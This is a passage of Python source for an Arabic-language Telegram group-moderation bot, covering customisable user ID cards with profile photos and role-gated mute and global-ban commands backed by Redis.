      if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} عذراً الامر يخص ↤〖 المدير 〗فقط .')
      if not r.get(f'{m.chat.id}:customID:{Dev_Zaid}'):
        return m.reply(f'{k} الايدي مو معدل')
      else:
        m.reply(f'{k} ابشر مسحت الايدي')
        r.delete(f'{m.chat.id}:customID:{Dev_Zaid}')
        return

   if text == 'مسح الايدي العام' or text == 'مسح الايدي عام':
      if not dev2_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} عذراً الامر يخص ↤〖 Dev²🎖 〗فقط .')
      if not r.get(f'customID:{Dev_Zaid}'):
        return m.reply(f'{k} الايدي العام مو معدل')
      else:
        m.reply(f'{k} ابشر مسحت الايدي العام')
        r.delete(f'customID:{Dev_Zaid}')

   if text == 'الايدي':
      if not mod_pls(m.from_user.id, m.chat.id):
        return
      if not r.get(f'{m.chat.id}:customID:{Dev_Zaid}'):
        return m.reply(f'{k} الايدي مو معدل')
      else:
        id = r.get(f'{m.chat.id}:customID:{Dev_Zaid}')
        return m.reply(f'`{id}`')

   if text == 'الايدي العام':
      if not dev2_pls(m.from_user.id, m.chat.id):
        return
      if not r.get(f'customID:{Dev_Zaid}'):
        return m.reply(f'{k} الايدي العام مو معدل')
      else:
        id = r.get(f'customID:{Dev_Zaid}')
        return m.reply(f'`{id}`')

   if text == 'تغيير الايدي':
      if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} عذراً الامر يخص ↤〖 المدير 〗فقط .')
      else:
        id = random.choice(custom_ids)
        r.set(f'{m.chat.id}:customID:{Dev_Zaid}', id)
        m.reply(f'{k} وسوينا الايدي\n{k} يمديك تجرب شكل الايدي الجديد الحين')

   if text == 'تعيين الايدي':
      if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} عذراً الامر يخص ↤〖 المدير 〗فقط .')
      reply = '''
تمام , الحين ارسل شكل الايدي الجديد

- الاختصارات:

{الاسم} ↼ يطلع اسم الشخص
{الايدي} ↼ يطلع ايدي الشخص
{اليوزر} ↼ يطلع يوزر الشخص
{الرتبه} ↼ يطلع رتبته الشخص
{التفاعل} ↼ يطلع تفاعل الشخص
{الرسائل} ↼ يطلع كم رسالة عند الشخص
{التعديل} ↼ يطلع كم مره عدل الشخص
{البايو} ↼ يطلع البايو اللي كاتبه
{تعليق} ↼ يطلع تعليق عشوائي
{الانشاء} ↼ يطلع انشاء الحساب

قناة اشكال الايدي https://t.me/EFFB0T/187

'''
      m.reply(reply)
      r.set(f'{m.chat.id}:addCustomID:{m.from_user.id}{Dev_Zaid}', 1)
      return
   if text == 'تعيين الايدي عام':
      if not dev2_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} عذراً الامر يخص ↤〖 Dev²🎖 〗فقط .')
      reply = '''
تمام , الحين ارسل شكل الايدي الجديد

- الاختصارات:

{الاسم} ↼ يطلع اسم الشخص
{الايدي} ↼ يطلع ايدي الشخص
{اليوزر} ↼ يطلع يوزر الشخص
{الرتبه} ↼ يطلع رتبته الشخص
{التفاعل} ↼ يطلع تفاعل الشخص
{الرسائل} ↼ يطلع كم رسالة عند الشخص
{التعديل} ↼ يطلع كم مره عدل الشخص
{البايو} ↼ يطلع البايو اللي كاتبه
{تعليق} ↼ يطلع تعليق عشوائي
{الانشاء} ↼ يطلع انشاء الحساب

قناة اشكال الايدي https://t.me/EFFB0T/187
'''
      m.reply(reply)
      r.set(f'{m.chat.id}:addCustomIDG:{m.from_user.id}{Dev_Zaid}', 1)
      return True


   if text == 'تفعيل الايدي':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 الادمن 〗فقط .')
     else:
       if not r.get(f'{m.chat.id}:disableID:{Dev_Zaid}'):
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} الايدي مفعل من قبل')
       else:
         r.delete(f'{m.chat.id}:disableID:{Dev_Zaid}')
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} ابشر فعلت الايدي')

   if text == 'تعطيل الايدي':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 الادمن 〗فقط .')
     else:
       if r.get(f'{m.chat.id}:disableID:{Dev_Zaid}'):
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} الايدي معطل من قبل')
       else:
         r.set(f'{m.chat.id}:disableID:{Dev_Zaid}',1)
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} ابشر عطلت الايدي')

   if text == 'تفعيل افتاري':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 الادمن 〗فقط .')
     else:
       if not r.get(f'{m.chat.id}:disableAV:{Dev_Zaid}'):
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} افتار مفعل من قبل')
       else:
         r.delete(f'{m.chat.id}:disableAV:{Dev_Zaid}')
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} ابشر فعلت افتار')

   if text == 'تعطيل افتاري':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 الادمن 〗فقط .')
     else:
       if r.get(f'{m.chat.id}:disableAV:{Dev_Zaid}'):
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} افتار معطل من قبل')
       else:
         r.set(f'{m.chat.id}:disableAV:{Dev_Zaid}',1)
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} ابشر عطلت افتار')

   if text == 'تعطيل الايدي بالصوره':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 الادمن 〗فقط .')
     else:
       if r.get(f'{m.chat.id}:disableIDPHOTO:{Dev_Zaid}'):
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} الايدي بالصوره معطل من قبل')
       else:
         r.set(f'{m.chat.id}:disableIDPHOTO:{Dev_Zaid}',1)
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} ابشر عطلت الايدي بالصوره')

   if text == 'تفعيل الايدي بالصوره':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} عذراً الامر يخص ↤〖 الادمن 〗فقط .')
     else:
       if not r.get(f'{m.chat.id}:disableIDPHOTO:{Dev_Zaid}'):
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} الايدي بالصوره مفعل من قبل')
       else:
         r.delete(f'{m.chat.id}:disableIDPHOTO:{Dev_Zaid}')
         return m.reply(f'{k} بواسطة ↤ {m.from_user.mention}\n{k} ابشر فعلت الايدي بالصوره')

   if text == "لقبي":
     title = m.chat.get_member(m.from_user.id).custom_title
     if not title:
       return m.reply(f"{k} ماعندك لقب")
     else:
       return m.reply(f"{k} لقبك ↢ ( {title} )")

   if (text == 'ايدي' or text.lower() == 'ا') and m.reply_to_message and m.reply_to_message.from_user:
       return m.reply(f'الايدي ↢ ( `{m.reply_to_message.from_user.id}` )')

   if (text == 'ايدي' or text.lower() == 'id') and not m.reply_to_message:
      if r.get(f'{m.chat.id}:disableID:{Dev_Zaid}'):  return
      if r.get(f'{m.chat.id}:customID:{Dev_Zaid}'):
         id = r.get(f'{m.chat.id}:customID:{Dev_Zaid}')
      else:
         if r.get(f'customID:{Dev_Zaid}'):
           id = r.get(f'customID:{Dev_Zaid}')
         else:
           id = '''
𖡋 𝐔𝐒𝐄 ⌯  {اليوزر}
𖡋 𝐌𝐒𝐆 ⌯  {الرسائل}
𖡋 𝐒𝐓𝐀 ⌯  {الرتبه}
𖡋 𝐈𝐃 ⌯  {الايدي}
𖡋 𝐄𝐃𝐈𝐓 ⌯  {التعديل}
𖡋 𝐂𝐑  ⌯  {الانشاء}
{البايو}'''
      if m.from_user.usernames:
         username = ''
         for i in m.from_user.usernames: username += f"@{i.username} "
      elif m.from_user.username:
         username = f'@{m.from_user.username}'
      else:
         username = 'مافي يوزر'
      rank = get_rank(m.from_user.id, m.chat.id)
      msg = int(r.get(f'{Dev_Zaid}{m.chat.id}:TotalMsgs:{m.from_user.id}'))
      msgs = f"{msg}"
      iD = f'`{m.from_user.id}`'
      if not r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'):
         edits = 0
      else:
         edit= int(r.get(f'{m.chat.id}:TotalEDMsgs:{m.from_user.id}{Dev_Zaid}'))
         edits = f"{edit}"
      name = m.from_user.first_name
      create = get_creation_date(m.from_user.id)
      get_chat = c.get_chat(m.from_user.id)
      if get_chat.bio :
         bio = get_chat.bio
      else:
         bio = 'مافي بايو'
      if msg > 50:
        tfa3l = 'شد حيلك'
      if msg > 500:
        tfa3l = 'يجي منك'
      if msg > 750:
        tfa3l = 'تفاعل متوسط'
      if msg > 2500:
        tfa3l = 'متفاعل'
      if msg > 5000:
        tfa3l = 'اسطورة التفاعل'
      if msg > 10000:
        tfa3l = 'اسطورة التلي'
      else:
        tfa3l = 'تفاعل صفر'
      comment = random.choice(comments)
      text = id.replace('{الاسم}', name).replace('{اليوزر}', username).replace('{الرسائل}',str(msgs)).replace('{التعديل}', str(edits)).replace('{الانشاء}', create).replace('{البايو}', f'{bio}').replace('{الايدي}', iD).replace('{الرتبه}', rank).replace('{التفاعل}', tfa3l).replace('{تعليق}', comment)
      if r.get(f'{m.chat.id}:disableIDPHOTO:{Dev_Zaid}'):
         return m.reply(text, disable_web_page_preview=True)
      else:
         if m.from_user.photo:
           get_user = c.invoke(GetFullUser(id=(c.resolve_peer(m.from_user.id))))
           photo = get_user.full_user.profile_photo
           video = photo.video_sizes
           if video:
             if len(video) == 3:
               video = video[-2]
             else:
               video = video[-1]
           if video:
              file = BytesIO()
              hash = photo.access_hash
              if r.get(f"{hash}:{m.from_user.id}"):
                return m.reply_animation(r.get(f"{hash}:{m.from_user.id}"), caption=text)
              for byte in c.stream_media(
                message=FileId(
                  file_type=FileType.PHOTO,
                  dc_id=photo.dc_id, media_id=photo.id,
                  access_hash=photo.access_hash,
                  file_reference=photo.file_reference,
                  thumbnail_source=ThumbnailSource.THUMBNAIL,
                  thumbnail_file_type=FileType.PHOTO,
                  thumbnail_size=video.type,
                  volume_id=0, local_id=0
                ).encode()
              ):
                file.write(byte)
              file.name = f'{m.from_user.id}vid{m.chat.id}.mp4'
              send = m.reply_animation(file, caption=text)
              r.set(f"{hash}:{m.from_user.id}",send.animation.file_id,ex=3600)
              return True
           else:
              file_id=FileId(
                        file_type=FileType.PHOTO,
                        dc_id=photo.dc_id,
                        media_id=photo.id,
                        access_hash=photo.access_hash,
                        file_reference=photo.file_reference,
                        thumbnail_source=ThumbnailSource.THUMBNAIL,
                        thumbnail_file_type=FileType.PHOTO,
                        thumbnail_size=photo.sizes[0].type,
                        volume_id=0,
                        local_id=0
                    ).encode()
              return m.reply_photo(file_id, caption=text)
         else:
           return m.reply(text, disable_web_page_preview=True)


@Client.on_message(filters.new_chat_members, group=1)
def addContact(c,m):
  for me in m.new_chat_members:
    if not m.from_user.id == me.id:
      if not r.get(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}'):
        r.set(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}',1)
      else:
        co = int(r.get(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}'))
        r.set(f'{m.chat.id}TotalContacts{m.from_user.id}{Dev_Zaid}',co+1)


'''

@Client.on_message(filters.text & filters.group, group=17)
def setIDHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    set_id(c,m,k)


def set_id(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   text = m.text
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')

'''




# ==================== FILE: mute_and_gban.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''


@Client.on_message(filters.text & filters.group, group=14)
def mutesHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=mute_func,args=(c,m,k)).start()
    
    
def mute_func(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if isLockCommand(m.from_user.id, m.chat.id, text): return

   if text == 'كتم' and m.reply_to_message and m.reply_to_message.from_user:
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if not mod_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
        if id == m.from_user.id:
           return m.reply('شفيك تبي تنزل نفسك')
        if pre_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
        if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مكتوم من قبل\n☆')
        else:
          r.set(f'{id}:mute:{m.chat.id}{Dev_Zaid}', 1)
          r.sadd(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} كتمته\n☆')
   
   if re.match("^كتم عام (.*?)$", text) and len(text.split()) ==  3:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not dev_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المطور وفوق ) بس')      
      user = text.split()[2]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         return m.reply(f'{k} مافيه يوزر كذا')
      if dev_pls(id, m.chat.id):
         rank = get_rank(id,m.chat.id)
         return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
      if r.get(f'{id}:mute:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مكتوم عام من قبل\n☆')
      else:
          r.set(f'{id}:mute:{Dev_Zaid}', 1)
          r.sadd(f'listMUTE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} كتمته عام\n☆')

   if re.match("^كتم (.*?)$", text) and len(text.split()) == 2:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not admin_pls(m.from_user.id,m.chat.id):
         return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
      user = text.split()[1]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         return m.reply(f'{k} مافيه يوزر كذا')
      if id == m.from_user.id:
        return m.reply('شفيك تبي تنزل نفسك')
      if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
         return m.reply(f'「 {mention} 」\n{k} مكتوم من قبل\n☆')
      if pre_pls(id, m.chat.id):
         rank = get_rank(id,m.chat.id)
         return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
      r.set(f'{id}:mute:{m.chat.id}{Dev_Zaid}', 1)
      r.sadd(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
      return m.reply(f'「 {mention} 」\n{k} كتمته\n☆')
   
   if text == 'الغاء الكتم' and m.reply_to_message and m.reply_to_message.from_user:
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if not admin_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
        if not r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مكتوم قبل\n☆')
        else:
          r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
          r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} ابشر الغيت كتمه\n༄')
   
   if re.match("^الغاء الكتم العام (.*?)$", text) and len(text.split()) ==  4:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not dev_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      user = text.split()[3]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         id = re.findall('[0-9]+', text)[0] if re.findall('[0-9]+', text) else None
         if not id:  return m.reply(f"{k} مافيه مستخدم كذا")
         mention = f'[{id}](tg://user?id={id})'
      if not r.get(f'{id}:mute:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مكتوم عام من قبل\n☆')
      else:
          r.delete(f'{id}:mute:{Dev_Zaid}')
          r.srem(f'listMUTE:{Dev_Zaid}',id)
          return m.reply(f'「 {mention} 」\n{k} لغيت كتمته عام\n☆')

   if re.match("^الغاء الكتم (.*?)$", text) and len(text.split()) ==  3:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not mod_pls(m.from_user.id,m.chat.id):
         return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
      user = text.split()[2]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         id = re.findall('[0-9]+', text)[0] if re.findall('[0-9]+', text) else None
         if not id:  return m.reply(f"{k} مافيه مستخدم كذا")
         mention = f'[{id}](tg://user?id={id})'
      if not r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
         return m.reply(f'「 {mention} 」\n{k} مو مكتوم من قبل\n☆')
      r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
      r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
      return m.reply(f'「 {mention} 」\n{k} أبشر الغيت كتمه\n☆')
   
   if re.match("^حظر عام (.*?)$", text) and len(text.split()) ==  3:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not dev_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المطور وفوق ) بس')      
      user = text.split()[2]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         return m.reply(f'{k} مافيه يوزر كذا')
      if dev_pls(id, m.chat.id):
         rank = get_rank(id,m.chat.id)
         return m.reply(f'{k} هييه مايمديك تحظر {rank} يورع!')
      if r.get(f'{id}:gban:{Dev_Zaid}'):
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} محظور عام من قبل\n☆')
      else:
          r.set(f'{id}:gban:{Dev_Zaid}', 1)
          r.sadd(f'listGBAN:{Dev_Zaid}', id)
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} حظرته عام\n☆')
   
   if re.match("^حظر عام من الالعاب (.*?)$", text) and len(text.split()) ==  5:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not dev_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      user = text.split()[4]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         return m.reply(f'{k} مافيه يوزر كذا')
      if dev_pls(id, m.chat.id):
         rank = get_rank(id,m.chat.id)
         return m.reply(f'{k} هييه مايمديك تحظر {rank} يورع!')
      if r.get(f'{id}:gbangames:{Dev_Zaid}'):
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} محظور من الالعاب من قبل\n☆')
      else:
          r.set(f'{id}:gbangames:{Dev_Zaid}', 1)
          r.sadd(f'listGBANGAMES:{Dev_Zaid}', id)
          r.delete(f'{id}:Floos')
          r.srem("BankList",id)
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} حظرته عام من الالعاب\n☆')
   
   if re.match("^الغاء الحظر العام من الالعاب (.*?)$", text) and len(text.split()) ==  6:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not dev_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      user = text.split()[5]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         id = re.findall('[0-9]+', text)[0] if re.findall('[0-9]+', text) else None
         if not id:  return m.reply(f"{k} مافيه مستخدم كذا")
         mention = f'[{id}](tg://user?id={id})'
      if not r.get(f'{id}:gbangames:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو محظور من الالعاب من قبل\n☆')
      else:
          r.delete(f'{id}:gbangames:{Dev_Zaid}')
          r.srem(f'listGBANGAMES:{Dev_Zaid}',id)
          return m.reply(f'「 {mention} 」\n{k} لغيت حظره من الالعاب عام\n☆')

   if re.match("^الغاء الحظر العام (.*?)$", text) and len(text.split()) ==  4:
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not dev_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      user = text.split()[3]
      try:
        id = int(user)
      except:
        id = user.replace('@','')
      try:
         get = c.get_chat(user)
         mention = f'[{get.first_name}](tg://user?id={get.id})'
         id = get.id
      except:
         id = re.findall('[0-9]+', text)[0] if re.findall('[0-9]+', text) else None
         if not id:  return m.reply(f"{k} مافيه مستخدم كذا")
         mention = f'[{id}](tg://user?id={id})'
      if not r.get(f'{id}:gban:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو محظور عام من قبل\n☆')
      else:
          r.delete(f'{id}:gban:{Dev_Zaid}')
          r.srem(f'listGBAN:{Dev_Zaid}',id)
          return m.reply(f'「 {mention} 」\n{k} لغيت حظره عام\n☆')

@Client.on_message(filters.group, group=15)
def muteResponse(c,m):
    del_formutes(c,m)
    
def del_formutes(c,m):
   if r.get(f'{m.from_user.id}:gban:{Dev_Zaid}'):
     try:
        m.chat.ban_member(m.from_user.id)
     except:
        m.delete()
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):
     try:
       m.delete()
     except FloodWait as x:
       time.sleep(x.value)
     except Exception:
       pass




@Client.on_message(filters.text & filters.group, group=16)
def mutesHandlerG(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=mute_funcg,args=(c,m,k)).start()
    
    
def mute_funcg(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
       
   if text == 'كتم عام' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if dev_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
        if r.get(f'{id}:mute:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مكتوم عام من قبل\n☆')
        else:
          r.set(f'{id}:mute:{Dev_Zaid}', 1)
          r.sadd(f'listMUTE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} كتمته عام\n☆')
      
   if text == 'حظر عام' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if dev_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تحظر {rank} يورع!')
        if r.get(f'{id}:gban:{Dev_Zaid}'):
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} محظور عام من قبل\n☆')
        else:
          r.set(f'{id}:gban:{Dev_Zaid}', 1)
          r.sadd(f'listGBAN:{Dev_Zaid}', id)
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} حظرته عام\n☆')
   
   if text == 'حظر عام من الالعاب' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المطور وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if dev_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تحظر {rank} يورع!')
        if r.get(f'{id}:gbangames:{Dev_Zaid}'):
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} محظور من الالعاب من قبل\n☆')
        else:
          r.set(f'{id}:gbangames:{Dev_Zaid}', 1)
          r.sadd(f'listGBANGAMES:{Dev_Zaid}', id)
          r.delete(f'{id}:Floos')
          r.srem("BankList",id)
          return m.reply(f'{k} الحمار「 {mention} 」\n{k} حظرته عام من الالعاب\n☆')

   if text == 'الغاء الكتم العام' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المطور وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if dev_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
        if not r.get(f'{id}:mute:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مكتوم عام من قبل\n☆')
        else:
          r.delete(f'{id}:mute:{Dev_Zaid}')
          r.srem(f'listMUTE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} لغيت كتمته عام\n☆')
   
   if text == 'الغاء الحظر العام من الالعاب' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if dev_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
        if not r.get(f'{id}:gbangames:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو محظور من الالعاب من قبل\n☆')
        else:
          r.delete(f'{id}:gbangames:{Dev_Zaid}')
          r.srem(f'listGBANGAMES:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} لغيت حظره من الالعاب\n☆')

   if text == 'الغاء الحظر العام' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev_pls(m.from_user.id,m.chat.id):
